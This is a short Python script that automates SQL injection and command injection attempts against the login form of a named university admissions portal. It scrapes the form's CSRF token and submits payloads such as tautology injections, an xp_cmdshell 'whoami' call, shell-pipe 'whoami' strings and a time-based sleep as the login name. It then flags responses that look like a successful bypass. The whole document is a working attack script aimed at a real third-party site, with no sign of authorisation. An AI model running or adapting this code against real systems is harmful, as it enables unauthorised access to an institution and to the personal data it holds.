import requests
from bs4 import BeautifulSoup

# TARGET URL
base_url = "https://portals.au.edu.pk/ADMISSIONS_TEST"
login_url = base_url

# Common payloads
payloads = [
    "' OR 1=1--",
    "'; exec xp_cmdshell('whoami')--",
    "test@example.com | whoami",
    "test@example.com & whoami",
    "admin' --",
    "' OR '1'='1",
    "' OR sleep(5)--"
]

# Create a session
session = requests.Session()

def get_csrf_token():
    r = session.get(login_url, verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "__RequestVerificationToken"})
    return token['value'] if token else None

def try_login(payload):
    csrf_token = get_csrf_token()
    if not csrf_token:
        print("CSRF token not found")
        return

    data = {
        "LoginName": payload,
        "Password": "randomPassword",
        "__RequestVerificationToken": csrf_token,
        "btnSubmit": "Login"
    }

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": login_url
    }

    response = session.post(login_url, data=data, headers=headers, verify=False)
    if "Invalid" not in response.text and "error" not in response.text:
        print(f"[+] Potentially successful with payload: {payload}")
    else:
        print(f"[-] Payload failed: {payload}")

# Run all payloads
for payload in payloads:
    try_login(payload)
